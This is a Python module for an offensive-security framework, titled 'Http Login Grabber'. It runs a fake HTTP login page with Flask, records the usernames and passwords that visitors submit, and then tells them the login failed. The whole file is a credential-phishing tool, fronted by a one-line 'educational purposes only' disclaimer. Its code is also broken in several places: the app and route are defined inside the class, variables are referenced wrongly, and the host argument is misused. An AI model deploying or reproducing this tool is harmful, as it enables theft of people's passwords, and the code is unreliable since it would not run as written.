import pyfiglet
import requests
from flask import Flask, request, render_template_string
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Http Login Grabber',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'capture credentials** from a fake HTTP login pages ',
            'Note':'This is for educational purposes only, and you must have explicit permission to test any system.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('URL', ('http://127.0.0.1/login', True, 'Target address.')),
                ('PORT', ('8080', True, 'Address port number')),
                ('PAGE', ('', False, 'Your own fake login pages(optional)'))
                ])
                }
    def logo(self):
    	title = 'Http Login Grabber'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set URL <http://127.0.0.1/login> |  set PORT <port> | set PAGE <optional>  ,then run")
   
    # Fake Login Page Credential Grabber
    app = Flask(__name__)
    # HTML template for the fake login page
    login_page = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
    <h2>Login</h2>
    <form method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""    
    
    @app.route('/', methods=['GET', 'POST'])    
    def login(self):
      if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(f"[+] Captured Credentials - Username: {username}, Password: {password}")
        return "Login Failed. Please try again."
      return render_template_string(login_page)
                
    def execute(self):
        url = self.info['Options']['URL'][0]
        port = self.info['Options']['PORT'][0]
        page = self.info['Options']['PAGE'][0]
        self.logo()
        # Run the fake login page
        app.run(host=url, port=port)
        return "[+] Starting fake login page on {url}:{port}"
    